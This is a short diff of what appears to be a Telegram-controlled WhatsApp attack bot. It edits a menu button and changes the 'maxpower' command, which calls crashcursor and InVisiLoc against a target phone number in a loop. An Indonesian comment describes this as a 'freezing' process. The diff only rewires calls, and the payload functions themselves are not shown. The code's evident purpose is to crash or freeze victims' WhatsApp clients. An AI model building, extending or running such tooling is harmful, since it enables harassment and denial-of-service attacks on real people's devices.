@@ -1377,11 +1377,7 @@ const donerespone = (target, ctx) => {
     const keyboard = [
         [
             {
-                text: "ぢ",
-                callback_data: "/menu"
-            },
-            {
-                text: "☁️ Support Owner",
+                text: "👾 Ranz Wang$app",
                 url: "https://t.me/"
             }
         ]
@@ -1491,9 +1487,9 @@ bot.command("maxpower", cooldownMiddleware, checkWhatsAppConnection, async ctx =
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 13; i++) {
+  for (let i = 0; i < 3; i++) {
     await crashcursor(target, { ptcp: true });
-    await sendOfferCall(target, { ptcp: true });
+    await InVisiLoc(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
